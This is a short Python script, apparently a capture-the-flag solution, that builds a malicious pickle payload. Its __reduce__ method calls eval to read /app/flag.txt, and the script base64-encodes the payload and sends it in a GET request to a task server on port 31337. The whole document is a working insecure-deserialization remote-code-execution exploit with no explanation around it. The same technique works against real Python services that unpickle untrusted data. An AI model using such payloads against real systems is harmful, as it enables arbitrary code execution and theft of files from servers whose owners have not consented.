import base64
import pickle

import requests


class PickleRCE(object):
    def __reduce__(self):
        return eval, ("""Recipe(name="DeusDeveloper", recipe=open("/app/flag.txt", "r").read())""",)

def main():
    payload = pickle.dumps(PickleRCE())
    print(payload)
    recipe = base64.urlsafe_b64encode(payload).decode()

    response = requests.get(
        url=f"http://tasks.mxkv.ru:31337/recipe?recipe={recipe}",
    )
    print(response)
    print(response.text)



if __name__ == '__main__':
    main()